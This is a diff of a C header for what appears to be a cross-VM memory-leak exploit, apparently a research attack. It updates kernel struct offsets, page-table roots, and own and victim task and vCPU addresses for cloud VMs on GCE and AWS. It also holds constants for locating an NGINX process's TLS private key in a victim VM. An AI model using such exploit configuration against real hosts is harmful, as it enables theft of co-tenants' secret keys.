@@ -53,7 +53,7 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 
 // struct task_struct {
 #define G_TASK_TASKS		0x890	// struct list_head tasks
-#define G_TASK_MM		0x940	// struct mm_struct *mm
+#define G_TASK_MM		0x8e0	// struct mm_struct *mm
 #define G_TASK_PID		0x960	// pid_t pid, tgid
 #define G_TASK_PARENT		0x970	// struct task_struct *real_parent TODO THIS IS ONLY GUESS
 #define G_TASK_CHILDREN		0x980	// struct list_head children TODO THIS IS ONLY GUESS
@@ -64,7 +64,7 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 
 // struct mm_struct {
 #define G_MM_PGD		0x78	// pgd_t *pgd
-#define G_MM_HEAP		0x158	// unsigned long start_brk
+#define G_MM_HEAP		0x168	// unsigned long start_brk
 // };
 
 #define NGINX_SSLKEY		0x8b99f
@@ -339,7 +339,7 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 #define OWN_TASK	0xffffa03706e28000
 #define HCR3		0x587fa6000UL
 #define OWN_KVM		0xffffb1b08d9f5000
-#define VICTIM_TASK     0xffff929245ad4100
+#define VICTIM_TASK	0xffff929245ad4100
 #define VICTIM_KVM	0xffffb1b08ef31000
 #define VICTIM_VCPU	0xffffa03509694600
 #define EPTP		0x19b9f2000UL
@@ -356,6 +356,15 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 #define OWN_VCPU	0xffff934153430e80
 #define OWN_TASK	0xffff936fa3088040
 #define HCR3		0x111cf6000UL
+#define VICTIM_TASK	0xffff935f6acfe140
+#define VICTIM_VCPU	0xffff93479fb210c0
+#define EPTP		0x88030b000UL
+#define GCR3		0x3adfb1e000UL
+#define GTEXT		0xffffffff90600000
+#define GDM		0xffff919200000000
+#define NGINX		0xffff91930087af40
+#define NGINX_CR3	0x117e010000UL
+#define SSLKEY_HPA      0x16ff0999fUL
 // ---------[ old (pre-reboot) rain-vm-gce ]---------
 // #define BASE		0x88d43f218UL
 // #define HOST_DIRECT_MAP	0xffff934040000000
@@ -363,10 +372,6 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 // #define OWN_TASK	0xffff936a91dba000
 // #define HCR3		0x111cf6000UL
 // #define OWN_KVM		0xffff9584f2d71000
-#define VICTIM_VCPU	0xffff934214b80f40
-#define EPTP		0x12cc82000UL
-#define GCR3		0x23054e6000UL // 0x3987106000UL
-#define GTEXT		0xffffffffb7600000
 // ---------[ rain-vm-gce-victim ]---------
 // #define BASE		0x257d33218UL
 // #define HOST_DIRECT_MAP	0xffff934040000000
@@ -382,23 +387,23 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 // #define OWN_VCPU	0xffff93e461290000
 // #define OWN_TASK	0xffff93f671ad4ce0
 // #define HCR3		0xa1278000UL
-// #define OWN_KVM         0xffffab3801795000
+// #define OWN_KVM	0xffffab3801795000
 // --------[ rain-vm-aws-c5-extra ]----------
-#define BASE            0x9e39e218UL
+#define BASE		0x9e39e218UL
 #define HOST_DIRECT_MAP	0xffff9868c0000000
-#define OWN_VCPU        0xffff98695f2137c0
-#define OWN_TASK        0xffff98695f1eb2a0
-#define HCR3            0x9e154000UL
-#define VICTIM_TASK     0xffff987b61afb2a0
-#define VICTIM_VCPU     0xffff98695f2137c0 // 0xffff98695f20b7c0 // 0xffff98695f1f0000
-#define EPTP            0x9f333000UL // 0x9f35f000UL
-#define GCR3            0xa3668e000UL // ?
-// #define VICTIM_VCPU     0x
+#define OWN_VCPU	0xffff98695f2137c0
+#define OWN_TASK	0xffff98695f1eb2a0
+#define HCR3		0x9e154000UL
+#define VICTIM_TASK	0xffff987b61afb2a0
+#define VICTIM_VCPU	0xffff98695f2137c0 // 0xffff98695f20b7c0 // 0xffff98695f1f0000
+#define EPTP		0x9f333000UL // 0x9f35f000UL
+#define GCR3		0xa3668e000UL // ?
+// #define VICTIM_VCPU	0x
 // // --------[ rain-vm-aws-c5-extra-old ]----------
-// #define BASE            0x9b223218UL
+// #define BASE		0x9b223218UL
 // #define HOST_DIRECT_MAP	0xffff93e3c0000000
-// #define OWN_VCPU        0xffff93e3e5580000
-// #define OWN_TASK        0xffff93e461911860 // ?
+// #define OWN_VCPU	0xffff93e3e5580000
+// #define OWN_TASK	0xffff93e461911860 // ?
 
 #endif // MACHINE
 
